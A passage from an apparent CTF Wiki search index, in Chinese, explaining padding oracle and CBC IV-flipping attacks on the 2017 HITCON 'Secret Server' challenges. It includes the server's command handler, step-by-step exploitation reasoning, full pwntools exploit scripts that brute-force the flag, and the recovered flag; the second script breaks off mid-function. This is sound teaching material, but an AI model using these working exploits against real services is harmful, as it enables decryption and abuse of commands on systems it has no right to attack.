\uff0c\u63a5\u53d7\u7528\u6237\u7684 IV \u548c\u5bc6\u6587\uff0c\u5bf9\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u8fd4\u56de\u3002\u6839\u636e\u8fd4\u56de\u7684\u7ed3\u679c\u4f1a\u6709\u4e0d\u540c\u7684\u64cd\u4f5c</li> </ul> <pre><code>            msg = recv_msg().strip()\n            if msg.startswith('exit-here'):\n                exit(0)\n            elif msg.startswith('get-flag'):\n                send_msg(flag)\n            elif msg.startswith('get-md5'):\n                send_msg(MD5.new(msg[7:]).digest())\n            elif msg.startswith('get-time'):\n                send_msg(str(time.time()))\n            elif msg.startswith('get-sha1'):\n                send_msg(SHA.new(msg[8:]).digest())\n            elif msg.startswith('get-sha256'):\n                send_msg(SHA256.new(msg[10:]).digest())\n            elif msg.startswith('get-hmac'):\n                send_msg(HMAC.new(msg[8:]).digest())\n            else:\n                send_msg('command not found')\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_4","title":"\u4e3b\u8981\u6f0f\u6d1e","text":"<p>\u8fd9\u91cc\u6211\u4eec\u518d\u7b80\u5355\u603b\u7ed3\u4e00\u4e0b\u6211\u4eec\u5df2\u6709\u7684\u90e8\u5206</p> <ul> <li>\u52a0\u5bc6</li> <li>\u52a0\u5bc6\u65f6\u7684 IV \u662f\u56fa\u5b9a\u7684\u800c\u4e14\u5df2\u77e5\u3002</li> <li>'Welcome!!' \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002</li> <li>\u89e3\u5bc6</li> <li>\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 IV\u3002</li> </ul> <p>\u9996\u5148\uff0c\u65e2\u7136\u6211\u4eec\u77e5\u9053 <code>Welcome!!</code> \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u8fd8\u53ef\u4ee5\u63a7\u5236 recv_msg \u4e2d\u7684 IV\uff0c\u90a3\u4e48\u6839\u636e\u89e3\u5bc6\u8fc7\u7a0b</p>  P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV  <p>\u5982\u679c\u6211\u4eec\u5c06 <code>Welcome!!</code> \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u8f93\u5165\u7ed9 recv_msg\uff0c\u90a3\u4e48\u76f4\u63a5\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u4fbf\u662f <code>\uff08Welcome!!+'\\x07'*7) xor iv</code>\uff0c\u5982\u679c\u6211\u4eec\u6070\u5f53\u7684\u63a7\u5236\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\u4f20\u9012\u7684 iv\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u6267\u884c\u4e0a\u8ff0\u6240\u8bf4\u7684\u4efb\u610f\u547d\u4ee4\u3002\u4ece\u800c\uff0c\u6211\u4eec\u4e5f\u5c31\u53ef\u4ee5\u77e5\u9053 <code>flag</code> \u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u3002</p> <p>\u5176\u6b21\uff0c\u5728\u4e0a\u9762\u7684\u57fa\u7840\u4e4b\u4e0a\uff0c\u5982\u679c\u6211\u4eec\u5728\u4efb\u4f55\u5bc6\u6587 C \u540e\u9762\u6dfb\u52a0\u81ea\u5b9a\u4e49\u7684 IV \u548c Welcome \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u4f5c\u4e3a\u8f93\u5165\u4f20\u9012\u7ed9 recv_msg\uff0c\u90a3\u4e48\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u4e4b\u540e\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u90a3\u4e48\u7531\u4e8e unpad \u64cd\u4f5c\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u7684\u957f\u5ea6\u51cf\u5c0f 0 \u5230 255\u3002</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_5","title":"\u5229\u7528\u601d\u8def","text":"<p>\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b</p> <ol> <li>\u7ed5\u8fc7 proof of work</li> <li>\u6839\u636e\u6267\u884c\u4efb\u610f\u547d\u4ee4\u7684\u65b9\u5f0f\u83b7\u53d6\u52a0\u5bc6\u540e\u7684 flag\u3002</li> <li>\u7531\u4e8e flag \u7684\u5f00\u5934\u662f <code>hitcon{</code>\uff0c\u4e00\u5171\u67097\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6211\u4eec\u4efb\u7136\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236 iv \u6765\u4f7f\u5f97\u89e3\u5bc6\u540e\u7684\u524d 7 \u4e2a\u5b57\u8282\u4e3a\u6307\u5b9a\u5b57\u8282\u3002\u8fd9\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e8e\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u6267\u884c <code>get-md5</code> \u547d\u4ee4\u3002\u800c\u6839\u636e unpad \u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u6070\u597d\u5728\u6d88\u606f\u7684\u7b2c\u51e0\u4e2a\u5b57\u8282\u5904\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f00\u59cb\u65f6\u5c06\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u4e3a <code>hitcon{x</code>\uff0c\u5373\u53ea\u4fdd\u7559<code>hitcon{</code> \u540e\u7684\u4e00\u4e2a\u5b57\u8282\u3002\u8fd9\u6837\u4fbf\u53ef\u4ee5\u83b7\u5f97\u5e26\u4e00\u4e2a\u5b57\u8282\u54c8\u5e0c\u540e\u7684\u52a0\u5bc6\u7ed3\u679c\u3002\u7c7b\u4f3c\u5730\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u83b7\u5f97\u5e26\u5236\u5b9a\u4e2a\u5b57\u8282\u54c8\u5e0c\u540e\u7684\u52a0\u5bc6\u7ed3\u679c\u3002</li> <li>\u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u5730\u9010\u5b57\u8282\u7206\u7834\uff0c\u8ba1\u7b97\u5bf9\u5e94 <code>md5</code>\uff0c\u7136\u540e\u518d\u6b21\u5229\u7528\u4efb\u610f\u547d\u4ee4\u6267\u884c\u7684\u65b9\u5f0f\uff0c\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u660e\u6587\u4e3a\u4efb\u610f\u6307\u5b9a\u547d\u4ee4\uff0c\u5982\u679c\u63a7\u5236\u4e0d\u6210\u529f\uff0c\u90a3\u8bf4\u660e\u8be5\u5b57\u8282\u4e0d\u5bf9\uff0c\u9700\u8981\u518d\u6b21\u7206\u7834\uff1b\u5982\u679c\u6b63\u786e\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u5bf9\u5e94\u7684\u547d\u4ee4\u3002</li> </ol> <p>\u5177\u4f53\u4ee3\u7801\u5982\u4e0b</p> <pre><code>#coding=utf-8\nfrom pwn import *\nimport base64, time, random, string\nfrom Crypto.Cipher import AES\nfrom Crypto.Hash import SHA256, MD5\n#context.log_level = 'debug'\nif args['REMOTE']:\n    p = remote('52.193.157.19', 9999)\nelse:\n    p = remote('127.0.0.1', 7777)\n\n\ndef strxor(str1, str2):\n    return ''.join([chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(str1, str2)])\n\n\ndef pad(msg):\n    pad_length = 16 - len(msg) % 16\n    return msg + chr(pad_length) * pad_length\n\n\ndef unpad(msg):\n    return msg[:-ord(msg[-1])]  # \u53bb\u6389pad\n\n\ndef flipplain(oldplain, newplain, iv):\n\"\"\"flip oldplain to new plain, return proper iv\"\"\"\n    return strxor(strxor(oldplain, newplain), iv)\n\n\ndef bypassproof():\n    p.recvuntil('SHA256(XXXX+')\n    lastdata = p.recvuntil(')', drop=True)\n    p.recvuntil(' == ')\n    digest = p.recvuntil('\\nGive me XXXX:', drop=True)\n\n    def proof(s):\n        return SHA256.new(s + lastdata).hexdigest() == digest\n\n    data = pwnlib.util.iters.mbruteforce(\n        proof, string.ascii_letters + string.digits, 4, method='fixed')\n    p.sendline(data)\n    p.recvuntil('Done!\\n')\n\n\niv_encrypt = '2jpmLoSsOlQrqyqE'\n\n\ndef getmd5enc(i, cipher_flag, cipher_welcome):\n\"\"\"return encrypt( md5( flag[7:7+i] ) )\"\"\"\n    ## keep iv[7:] do not change, so decrypt won't change\n    new_iv = flipplain(\"hitcon{\".ljust(16, '\\x00'), \"get-md5\".ljust(\n        16, '\\x00'), iv_encrypt)\n    payload = new_iv + cipher_flag\n    ## calculate the proper last byte number\n    last_byte_iv = flipplain(\n        pad(\"Welcome!!\"),\n        \"a\" * 15 + chr(len(cipher_flag) + 16 + 16 - (7 + i + 1)), iv_encrypt)\n    payload += last_byte_iv + cipher_welcome\n    p.sendline(base64.b64encode(payload))\n    return p.recvuntil(\"\\n\", drop=True)\n\n\ndef main():\n    bypassproof()\n\n    # result of encrypted Welcome!!\n    cipher = p.recvuntil('\\n', drop=True)\n    cipher_welcome = base64.b64decode(cipher)[16:]\n    log.info(\"cipher welcome is : \" + cipher_welcome)\n\n    # execute get-flag\n    get_flag_iv = flipplain(pad(\"Welcome!!\"), pad(\"get-flag\"), iv_encrypt)\n    payload = base64.b64encode(get_flag_iv + cipher_welcome)\n    p.sendline(payload)\n    cipher = p.recvuntil('\\n', drop=True)\n    cipher_flag = base64.b64decode(cipher)[16:]\n    flaglen = len(cipher_flag)\n    log.info(\"cipher flag is : \" + cipher_flag)\n\n    # get command not found cipher\n    p.sendline(base64.b64encode(iv_encrypt + cipher_welcome))\n    cipher_notfound = p.recvuntil('\\n', drop=True)\n\n    flag = \"\"\n    # brute force for every byte of flag\n    for i in range(flaglen - 7):\n        md5_indexi = getmd5enc(i, cipher_flag, cipher_welcome)\n        md5_indexi = base64.b64decode(md5_indexi)[16:]\n        log.info(\"get encrypt(md5(flag[7:7+i])): \" + md5_indexi)\n        for guess in range(256):\n            # locally compute md5 hash\n            guess_md5 = MD5.new(flag + chr(guess)).digest()\n            # try to null out the md5 plaintext and execute a command\n            payload = flipplain(guess_md5, 'get-time'.ljust(16, '\\x01'),\n                                iv_encrypt)\n            payload += md5_indexi\n            p.sendline(base64.b64encode(payload))\n            res = p.recvuntil(\"\\n\", drop=True)\n            # if we receive the block for 'command not found', the hash was wrong\n            if res == cipher_notfound:\n                print 'Guess {} is wrong.'.format(guess)\n            # otherwise we correctly guessed the hash and the command was executed\n            else:\n                print 'Found!'\n                flag += chr(guess)\n                print 'Flag so far:', flag\n                break\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>\u6700\u540e\u7ed3\u679c\u5982\u4e0b</p> <pre><code>Flag so far: Paddin9_15_ve3y_h4rd__!!}\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#2017-hitcon-secret-server-revenge","title":"2017 HITCON Secret Server Revenge","text":""},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_6","title":"\u63cf\u8ff0","text":"<pre><code>The password of zip is the flag of \"Secret Server\"\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_7","title":"\u5206\u6790","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u65f6\u63a5\u7740\u4e0a\u9762\u7684\u7a0b\u5e8f\u7ee7\u7eed\u641e\u7684\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u8fdb\u884c\u7684\u7b80\u5355\u7684\u4fee\u6539</p> <ul> <li>\u52a0\u5bc6\u7b97\u6cd5\u7684 iv \u672a\u77e5\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u6839\u636e Welcome \u52a0\u5bc6\u540e\u7684\u6d88\u606f\u63a8\u7b97\u51fa\u6765\u3002</li> <li>\u7a0b\u5e8f\u591a\u4e86\u4e00\u4e2a 56 \u5b57\u8282\u7684 token\u3002</li> <li>\u7a0b\u5e8f\u6700\u591a\u80fd\u8fdb\u884c 340 \u64cd\u4f5c\uff0c\u56e0\u6b64\u4e0a\u8ff0\u7684\u7206\u7834\u81ea\u7136\u4e0d\u53ef\u884c</li> </ul> <p>\u7a0b\u5e8f\u7684\u5927\u6982\u6d41\u7a0b\u5982\u4e0b</p> <ol> <li>\u7ecf\u8fc7 proof of work</li> <li>\u53d1\u9001 \u201cWelcome!!\u201d \u52a0\u5bc6\u540e\u7684\u6d88\u606f</li> <li>\u5728 340 \u6b21\u64cd\u4f5c\u4e2d\uff0c\u9700\u8981\u731c\u4e2d token \u7684\u503c\uff0c\u7136\u540e\u4f1a\u81ea\u52a8\u5c06 flag \u8f93\u51fa\u3002</li> </ol>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_8","title":"\u6f0f\u6d1e","text":"<p>\u5f53\u7136\uff0c\u5728\u4e0a\u4e2a\u9898\u76ee\u4e2d\u5b58\u5728\u7684\u6f0f\u6d1e\uff0c\u5728\u8fd9\u4e2a\u9898\u76ee\u4e2d\u4ecd\u7136\u5b58\u5728\uff0c\u5373</p> <ol> <li>\u4efb\u610f\u6267\u884c\u7ed9\u5b9a\u547d\u4ee4</li> <li>\u957f\u5ea6\u622a\u65ad</li> </ol>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_9","title":"\u5229\u7528\u601d\u8def","text":"<p>\u7531\u4e8e 340 \u7684\u6b21\u6570\u9650\u5236\uff0c\u867d\u7136\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u83b7\u5f97 <code>md5(token[:i])</code> \u52a0\u5bc6\u540e\u7684\u503c\uff08\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u90e8\u5206\u52a0\u5bc6\u540e\u6070\u597d\u662f 32 \u4e2a\u5b57\u8282\uff0c\u524d 16 \u4e2a\u5b57\u8282\u662f md5 \u540e\u52a0\u5bc6\u7684\u503c\uff0c\u540e\u9762\u7684 16 \u4e2a\u5b57\u8282\u5b8c\u5168\u662f\u586b\u5145\u7684\u52a0\u5bc6\u540e\u7684\u5b57\u8282\u3002\u8fd9\u91cc<code>md5(token[:i])</code>  \u7279\u6307\u524d16\u4e2a\u5b57\u8282\u3002\uff09\u3002\u4f46\u662f\uff0c\u6211\u4eec\u4e0d\u80fd\u518d\u6b21\u4e3a\u4e86\u83b7\u5f97\u4e00\u4e2a\u5b57\u7b26\u53bb\u7206\u7834 256 \u6b21\u4e86\u3002</p> <p>\u65e2\u7136\u4e0d\u80fd\u591f\u7206\u7834\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u4e00\u6b21\u83b7\u53d6\u4e00\u4e2a\u5b57\u8282\u7684\u5927\u5c0f\u5462\uff1f\u8fd9\u91cc\uff0c\u6211\u4eec\u518d\u6765\u68b3\u7406\u4e00\u4e0b\u8be5\u7a0b\u5e8f\u53ef\u80fd\u53ef\u4ee5\u6cc4\u6f0f\u7684\u4fe1\u606f</p> <ol> <li>\u67d0\u4e9b\u6d88\u606f\u7684 md5 \u503c\u52a0\u5bc6\u540e\u7684\u503c\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6 <code>md5(token[:i])</code> \u52a0\u5bc6\u540e\u7684\u503c\u3002</li> <li>unpad \u6bcf\u6b21\u4f1a\u5bf9\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u8fdb\u884c unpad\uff0c\u8fd9\u4e2a\u5b57\u8282\u662f\u6839\u636e\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6765\u51b3\u5b9a\u7684\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u51fa\u8fd9\u4e2a\u5b57\u8282\u7684\u5927\u5c0f\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u77e5\u9053\u4e00\u4e2a\u5b57\u8282\u7684\u503c\u3002</li> </ol> <p>\u8fd9\u91cc\u6211\u4eec\u6df1\u5165\u5206\u6790\u4e00\u4e0b unpad \u7684\u4fe1\u606f\u6cc4\u6f0f\u3002\u5982\u679c\u6211\u4eec\u5c06\u52a0\u5bc6 IV \u548c <code>encrypt(md5(token[:i]))</code> \u653e\u5728\u67d0\u4e2a\u5bc6\u6587 C \u7684\u540e\u9762\uff0c\u6784\u6210 <code>C|IV|encrypt(md5(token[:i]))</code>\uff0c\u90a3\u4e48\u89e3\u5bc6\u51fa\u6765\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u660e\u6587\u5757\u5c31\u662f <code>md5(token[:i])</code>\u3002\u8fdb\u800c\uff0c\u5728 unpad \u7684\u65f6\u5019\u5c31\u662f\u5229\u7528 <code>md5(token[:i])</code> \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff08 0-255\uff09\u8fdb\u884c unpad\uff0c\u4e4b\u540e\u5bf9 unpad \u540e\u7684\u5b57\u7b26\u4e32\u6267\u884c\u6307\u5b9a\u7684\u547d\u4ee4\uff08\u6bd4\u5982md5\uff09\u3002\u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u4e8b\u5148\u6784\u9020\u4e00\u4e9b\u6d88\u606f\u54c8\u5e0c\u540e\u52a0\u5bc6\u7684\u6837\u672c\uff0c\u7136\u540e\u5c06\u4e0a\u8ff0\u6267\u884c\u540e\u7684\u7ed3\u679c\u4e0e\u6837\u672c\u6bd4\u8f83\uff0c\u5982\u679c\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u57fa\u672c\u53ef\u4ee5\u786e\u5b9a <code>md5(token[:i])</code> \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u7136\u800c\uff0c\u5982\u679c <code>md5(token[:i])</code> \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5c0f\u4e8e16\uff0c\u90a3\u4e48\u5728 unpad \u65f6\u5c31\u4f1a\u5229\u7528\u4e00\u4e9b md5 \u4e2d\u7684\u503c\uff0c\u800c\u8fd9\u90e8\u5206\u503c\uff0c\u7531\u4e8e\u5bf9\u4e8e\u4e0d\u540c\u957f\u5ea6\u7684 <code>token[:i]</code> \u51e0\u4e4e\u90fd\u4e0d\u4f1a\u76f8\u540c\u3002\u6240\u4ee5\u53ef\u80fd\u9700\u8981\u7279\u6b8a\u5904\u7406\u3002</p> <p>\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u8fd9\u4e2a\u95ee\u9898\u7684\u5173\u952e\uff0c\u5373\u751f\u6210\u4e0e unpad \u5b57\u8282\u5927\u5c0f\u5bf9\u5e94\u7684\u52a0\u5bc6\u7ed3\u679c\u6837\u672c\uff0c\u4ee5\u4fbf\u4e8e\u67e5\u8868\u3002</p> <p>\u5177\u4f53\u5229\u7528\u601d\u8def\u5982\u4e0b</p> <ol> <li>\u7ed5\u8fc7 proof of work\u3002</li> <li>\u83b7\u53d6 token \u52a0\u5bc6\u540e\u7684\u7ed3\u679c <code>token_enc</code> \uff0c\u8fd9\u91cc\u4f1a\u5728 token \u524d\u9762\u6dfb\u52a0 7 \u4e2a\u5b57\u8282 <code>\"token: \"</code> \u3002 \u56e0\u6b64\u52a0\u5bc6\u540e\u7684\u957f\u5ea6\u4e3a 64\u3002</li> <li>\u4f9d\u6b21\u83b7\u53d6 <code>encrypt(md5(token[:i]))</code> \u7684\u7ed3\u679c\uff0c\u4e00\u5171\u662f 57 \u4e2a\uff0c\u5305\u62ec\u6700\u540e\u4e00\u4e2a token \u7684 padding\u3002</li> <li>\u6784\u9020\u4e0e unpad \u5927\u5c0f\u5bf9\u5e94\u7684\u6837\u672c\u3002\u8fd9\u91cc\u6211\u4eec\u6784\u9020\u5bc6\u6587 <code>token_enc|padding|IV_indexi|welcome_enc</code>\u3002\u7531\u4e8e <code>IV_indexi</code> \u662f\u4e3a\u4e86\u4fee\u6539\u6700\u540e\u4e00\u4e2a\u660e\u6587\u5757\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u8be5\u5b57\u8282\u5904\u4e8e\u53d8\u5316\u4e4b\u4e2d\u3002\u6211\u4eec\u82e5\u60f3\u83b7\u53d6\u4e00\u4e9b\u56fa\u5b9a\u5b57\u8282\u7684\u54c8\u5e0c\u503c\uff0c\u8fd9\u90e8\u5206\u81ea\u7136\u4e0d\u80fd\u6dfb\u52a0\u3002\u56e0\u6b64\u8fd9\u91cc\u4ea7\u751f\u6837\u672c\u65f6 unpad \u7684\u5927\u5c0f\u8303\u56f4\u4e3a 17 ~ 255\u3002\u5982\u679c\u6700\u540e\u6d4b\u8bd5\u65f6 <code>md5(token[:i])</code> \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5c0f\u4e8e17\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u4f1a\u51fa\u73b0\u4e00\u4e9b\u672a\u77e5\u7684\u6837\u672c\u3002\u5f88\u81ea\u7136\u7684\u4e00\u4e2a\u60f3\u6cd5\u662f\u6211\u4eec\u76f4\u63a5\u83b7\u53d6 255-17+1\u4e2a\u8fd9\u4e48\u591a\u4e2a\u6837\u672c\uff0c\u7136\u800c\uff0c\u5982\u679c\u8fd9\u6837\u505a\u7684\u8bdd\uff0c\u6839\u636e\u4e0a\u9762 340 \u7684\u6b21\u6570\uff08255-17+1+57+56&gt;340\uff09\u9650\u5236\uff0c\u6211\u4eec\u663e\u7136\u4e0d\u80fd\u83b7\u53d6\u5230 token \u7684\u6240\u6709\u5b57\u8282\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u590d\u7528\u4e00\u4e9b\u5185\u5bb9\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u590d\u7528  <code>encrypt(md5(token[:i]))</code>  \u7684\u7ed3\u679c\u3002\u90a3\u4e48\u6211\u4eec\u5728\u8865\u5145 padding \u65f6\u9700\u8981\u786e\u4fdd\u4e00\u65b9\u9762\u6b21\u6570\u591f\u7528\uff0c\u53e6\u4e00\u65b9\u9762\u53ef\u4ee5\u590d\u7528\u4e4b\u524d\u7684\u7ed3\u679c\u3002\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e unpad \u7684\u5faa\u73af\u4e3a 17 \u5230 208\uff0c\u5e76\u4f7f\u5f97 unpad \u5927\u4e8e 208 \u65f6\u6070\u597d unpad \u5230\u6211\u4eec\u53ef\u4ee5\u590d\u7528\u7684\u5730\u65b9\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f53 <code>md5(token[:i])</code> \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e3a 0 \u65f6\uff0c\u4f1a\u5c06\u6240\u6709\u89e3\u5bc6\u540e\u7684\u660e\u6587 unpad \u6389\uff0c\u56e0\u6b64\u4f1a\u51fa\u73b0 command not found \u7684\u5bc6\u6587\u3002</li> <li>\u518d\u6b21\u6784\u9020\u5bc6\u6587 <code>token_enc|padding|IV|encrypt(md5(token[:i]))</code> \uff0c\u90a3\u4e48\uff0c\u89e3\u5bc6\u65f6\u5373\u4f7f\u7528 <code>md5(token[:i])</code> \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u8fdb\u884c unpad\u3002\u5982\u679c\u8fd9\u4e2a\u5b57\u8282\u4e0d\u5c0f\u4e8e17\u6216\u8005\u4e3a0\uff0c\u5219\u53ef\u4ee5\u5904\u7406\u3002\u5982\u679c\u8fd9\u4e2a\u5b57\u8282\u5c0f\u4e8e17\uff0c\u90a3\u4e48\u663e\u7136\uff0c\u6700\u540e\u8fd4\u56de\u7ed9\u7528\u6237\u7684 md5 \u7684\u7ed3\u679c\u5e76\u4e0d\u5728\u6837\u672c\u8303\u56f4\u5185\uff0c\u90a3\u4e48\u6211\u4eec\u4fee\u6539\u5176\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u6700\u9ad8\u6bd4\u7279\u4f4d\uff0c\u4f7f\u5176 unpad \u540e\u53ef\u4ee5\u843d\u5728\u6837\u672c\u8303\u56f4\u5185\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u731c\u51fa <code>md5(token[:i])</code> \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002</li> <li>\u5728\u731c\u51fa <code>md5(token[:i])</code> \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u5730\u66b4\u529b\u7834\u89e3 256 \u6b21\uff0c\u627e\u51fa\u6240\u6709\u54c8\u5e0c\u503c\u672b\u5c3e\u4e3a <code>md5(token[:i])</code> \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u3002</li> <li>\u4f46\u662f\uff0c\u5728\u7b2c\u516d\u6b65\u4e2d\uff0c\u5bf9\u4e8e\u4e00\u4e2a <code>md5(token[:i])</code>  \u53ef\u80fd\u4f1a\u627e\u51fa\u591a\u4e2a\u5907\u9009\u5b57\u7b26\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u9700\u8981\u4f7f\u5f97\u5176\u672b\u5c3e\u5b57\u8282\u662f\u7ed9\u5b9a\u5b57\u8282\u5373\u53ef\u3002</li> <li>\u90a3\u4e48\uff0c\u95ee\u9898\u6765\u4e86\uff0c\u5982\u4f55\u5220\u9664\u4e00\u4e9b\u591a\u4f59\u7684\u5907\u9009\u5b57\u7b26\u4e32\u5462\uff1f\u8fd9\u91cc\u6211\u5c31\u9009\u62e9\u4e86\u4e00\u4e2a\u5c0f trick\uff0c\u5373\u5728\u9010\u5b57\u8282\u679a\u4e3e\u65f6\uff0c\u540c\u65f6\u679a\u4e3e\u51fa token \u7684 padding\u3002\u7531\u4e8e padding \u662f 0x01 \u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8fc7\u6ee4\u51fa\u6240\u6709\u7ed3\u5c3e\u4e0d\u662f 0x01 \u7684token \u5373\u53ef\u3002</li> </ol> <p>\u8fd9\u91cc\uff0c\u5728\u6d4b\u8bd5\u65f6\uff0c\u5c06\u4ee3\u7801\u4e2d <code>sleep</code> \u6ce8\u91ca\u6389\u4e86\u3002\u4ee5\u4fbf\u4e8e\u52a0\u5feb\u4ea4\u4e92\u901f\u5ea6\u3002\u5229\u7528\u4ee3\u7801\u5982\u4e0b</p> <pre><code>from pwn import *\nimport base64, time, random, string\nfrom Crypto.Cipher import AES\nfrom Crypto.Hash import SHA256, MD5\n#context.log_level = 'debug'\n\np = remote('127.0.0.1', 7777)\n\n\ndef strxor(str1, str2):\n    return ''.join([chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(str1, str2)])\n\n\ndef pad(msg):\n    pad_length = 16 - len(msg) % 16\n    return msg + chr(pad_length) * pad_length\n\n\ndef unpad(msg):\n    return msg[:-ord(msg[-1])]  # remove pad\n\n\ndef flipplain(oldplain, newplain, iv):\n\"\"\"flip oldplain to new plain, return proper iv\"\"\"\n    return strxor(strxor(oldplain, newplain), iv)\n\n\ndef bypassproof():\n    p.recvuntil('SHA256(XXXX+')\n    lastdata = p.recvuntil(')', drop=True)\n    p.recvuntil(' == ')\n    digest = p.recvuntil('\\nGive me XXXX:', drop=True)\n\n    def proof(s):\n        return SHA256.new(s + lastdata).hexdigest() == digest\n\n    data = pwnlib.util.iters.mbruteforce(\n        proof, string.ascii_letters + string.digits, 4, method='fixed')\n    p.sendline(data)\n\n\ndef sendmsg(iv, cipher):\n    payload = iv + cipher\n    payload = base64.b64encode(payload)\n    p.sendline(payload)\n\n\ndef recvmsg():\n    data = p.recvuntil(\"\\n\", drop=True)\n    data = base64.b64decode(data)\n    return data[:16], data[16:]\n\n\ndef getmd5enc(i, cipher_token, cipher_welcome, iv):\n\"\"\"return encrypt( md5( token[:i+1] ) )\"\"\"\n    ## keep iv[7:] do not change, so decrypt msg[7:] won't change\n    get_md5_iv = flipplain(\"token: \".ljust(16, '\\x00'), \"get-md5\".ljust(\n        16, '\\x00'), iv)\n    payload = cipher_token\n    ## calculate the proper last byte number\n    last_byte_iv = flipplain(\n        pad(\"Welcome!!\"),\n        \"a\" * 15 + chr(len(cipher_token) + 16 + 16 - (7 + i + 1)), iv)\n    payload += last_byte_iv + cipher_welcome\n    sendmsg(get_md5_iv, payload)\n    return recvmsg()\n\n\ndef get_md5_token_indexi(iv_encrypt, cipher_welcome, cipher_token):\n    md5_token_idxi = []\n    for i in range(len(cipher_token) - 7):\n        log.info(\"idx i: {}\".format(i))\n        _, md5_indexi = getmd5enc(i, cipher_token, cipher_welcome, iv_encrypt)\n        assert (len(md5_indexi) == 32)\n        # remove the last 16 byte for padding\n        md5_token_idxi.append(md5_indexi[:16])\n    return md5_token_idxi\n\n\ndef doin(unpadcipher, md5map, candidates, flag):\n    if unpadcipher in md5map:\n        lastbyte = md5map[unpadcipher]\n    else:\n        lastbyte = 0\n    if flag == 0:\n        lastbyte ^= 0x80\n    newcandidates = []\n    for x in candidates:\n        for c 